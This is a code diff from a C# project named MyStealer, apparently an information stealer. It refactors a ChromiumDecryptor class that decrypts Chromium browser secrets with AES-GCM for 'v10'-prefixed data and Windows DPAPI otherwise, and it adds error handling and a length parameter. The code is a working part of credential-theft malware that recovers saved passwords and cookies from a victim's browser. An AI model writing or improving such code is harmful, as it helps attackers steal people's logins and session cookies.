@@ -13,7 +13,7 @@ namespace MyStealer.Utils.Chromium
     /// </summary>
     public class ChromiumDecryptor
     {
-        private static readonly ILogger logger = Log.ForContext<ChromiumDecryptor>();
+        private static readonly ILogger logger = LogExt.ForModule(nameof(ChromiumDecryptor));
 
         private readonly byte[] aesKey;
 
@@ -33,9 +33,9 @@ namespace MyStealer.Utils.Chromium
             }
         }
 
-        public string Decrypt(byte[] cipherTextBytes)
+        public string Decrypt(int length, byte[] payload)
         {
-            if (cipherTextBytes.Length >= 3 && cipherTextBytes[0] == 'v' && cipherTextBytes[1] == '1' && cipherTextBytes[2] == '0') // 'v10' prefix -> AES-GCM encrypted
+            if (payload.Length >= 3 && payload[0] == 'v' && payload[1] == '1' && payload[2] == '0') // 'v10' prefix -> AES-GCM encrypted
             {
                 if (aesKey == null)
                 {
@@ -43,13 +43,21 @@ namespace MyStealer.Utils.Chromium
                     return "";
                 }
 
-                return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, aesKey, 3));
+                try
+                {
+                    return Encoding.UTF8.GetString(DecryptAesGcm(length, payload, aesKey, 3));
+                }
+                catch (Exception ex)
+                {
+                    Log.Error(ex, "Decryption failed!");
+                    return Convert.ToBase64String(payload);
+                }
             }
 
-            return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
+            return Encoding.UTF8.GetString(ProtectedData.Unprotect(payload, null, DataProtectionScope.CurrentUser));
         }
 
-        private byte[] DecryptAesGcm(byte[] payload, byte[] key, int nonSecretPayloadLength)
+        private byte[] DecryptAesGcm(int payloadLength, byte[] payload, byte[] key, int nonSecretPayloadLength)
         {
             const int KEY_BIT_SIZE = 256;
             const int MAC_BIT_SIZE = 128;
@@ -65,7 +73,7 @@ namespace MyStealer.Utils.Chromium
             {
                 _ = cipherReader.ReadBytes(nonSecretPayloadLength); // strip nasty 'v10' prefix
                 var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
-                var cipherText = cipherReader.ReadBytes(payload.Length - nonSecretPayloadLength - NONCE_BIT_SIZE / 8 - MAC_BIT_SIZE / 8);
+                var cipherText = cipherReader.ReadBytes(payloadLength - nonSecretPayloadLength - NONCE_BIT_SIZE / 8 - MAC_BIT_SIZE / 8);
 
                 // according to the GCM specification, tag is appended at the END of ciphertext
                 // https://stackoverflow.com/q/67989548
